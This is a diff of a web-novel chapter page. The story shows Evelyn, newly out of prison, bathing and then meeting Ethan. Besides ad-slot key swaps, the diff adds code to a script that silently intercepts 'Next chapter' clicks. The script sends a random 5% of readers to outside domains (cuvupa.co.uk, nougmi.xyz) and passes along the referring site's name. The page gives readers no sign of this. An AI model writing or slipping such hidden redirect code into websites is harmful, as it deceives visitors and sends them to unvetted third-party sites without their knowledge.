@@ -2393,7 +2393,7 @@
                 <p>Was that his way of admitting it?</p>
                 <p>To him, she was nothing but a jealous woman who had orchestrated Vanessa’s kidnapping, nearly leading to her assault.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>The evidence had been overwhelming, leaving Evelyn defenseless.</p>
                 <p>Vanessa had been ruthless enough to sacrifice her own reputation—and she had won.</p>
                 <p>Suddenly, Evelyn realized how absurd her seven years of devotion had been.</p>
@@ -2409,7 +2409,7 @@
                 <p>Inside, the maid wrinkled her nose. &#34;Miss, when was the last time you bathed? You should take better care of yourself.&#34;</p>
                 <p>Easy for you to say when you weren’t beaten daily in prison. But Evelyn stayed silent.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Once the maid left, she locked the door and scrubbed her skin raw for an hour.</p>
                 <p>The scars from prison still clung to her.</p>
                 <p>For three years, she had endured relentless torment. Though the last month had brought some reprieve, her wounds hadn’t healed.</p>
@@ -2417,7 +2417,7 @@
                 <p>The prison had offered no medical care, leaving injuries to fester. The worst was the deep scar on her left foot, which ached with every storm, a cruel reminder of her suffering.</p>
                 <p>Whenever the pain flared, Evelyn repeated to herself that it would fade—eventually.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Stepping out of the shower, she slipped into the fresh clothes the maid had left. They fit perfectly.</p>
                 <p>But the moment she opened the door, she collided with Ethan.</p>
                 <p>She staggered, nearly falling back.</p>
@@ -2425,7 +2425,7 @@
                 <p>The contact sent a jolt through them both.</p>
                 <p>Evelyn’s pulse spiked as she found herself pressed against his chest, the scent of tobacco clinging to him.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>She quickly pulled away, putting distance between them.</p>
                 <p>Trying to sound composed, she murmured, &#34;I’m sorry, sir. I didn’t mean to—&#34;</p>
                 <p>Noticing the cigarette in Ethan’s hand, she realized he must have been on his way outside when they crossed paths.</p>
@@ -2560,7 +2560,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2576,8 +2576,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
